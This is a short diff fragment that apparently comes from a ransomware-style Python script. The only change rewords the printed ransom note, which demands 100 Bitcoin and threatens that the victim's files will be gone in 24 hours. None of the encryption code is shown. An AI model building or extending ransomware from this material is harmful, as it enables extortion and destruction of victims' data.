@@ -27,5 +27,5 @@ for file in files:
 
 print(
     "All of your files have been encrypted! Send me 100 Bitcoin "
-    "or they will all be gone in 24 hours forever! ☠️"
+    "or they will be gone in 24 hours forever! ☠️"
 )
